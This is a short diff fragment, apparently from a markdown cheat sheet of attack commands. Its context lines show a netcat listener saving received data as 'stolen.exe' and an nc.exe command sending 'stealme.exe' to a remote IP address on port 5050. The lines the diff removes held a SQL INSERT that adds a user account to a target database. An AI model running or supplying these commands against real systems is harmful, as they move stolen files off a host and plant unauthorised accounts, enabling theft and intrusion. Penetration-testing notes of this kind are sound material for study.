@@ -63,7 +63,3 @@ nc -nvlp 5050 > stolen.exe
 nc.exe -w3 10.11.12.13 5050 < stealme.exe
 ```
 
-### Add a new user to a SQL database
-```sql
-INSERT INTO targetdb.usertbl(username, password) VALUES ('victor','please');
-```
